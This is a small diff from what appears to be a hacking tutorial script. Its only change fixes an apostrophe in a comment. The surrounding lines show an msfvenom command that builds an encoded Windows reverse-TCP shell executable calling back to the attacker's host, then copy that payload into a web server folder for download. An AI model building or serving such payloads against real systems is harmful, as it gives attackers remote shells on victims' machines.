@@ -148,7 +148,7 @@ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=$myIP LPOR
 #LHOST: Out computer
 #LPORT: Source port
 #-b: Invalid byte (explination beyond the scope of tutorial
-#-e: encoding: Almost always x86/shikata_ga_nai for exe's
+#-e: encoding: Almost always x86/shikata_ga_nai for exes
 #-f: Executible format. Always EXE for Windows.
 #-o: File output
 sudo mv ~/payload.exe /var/www/html/;
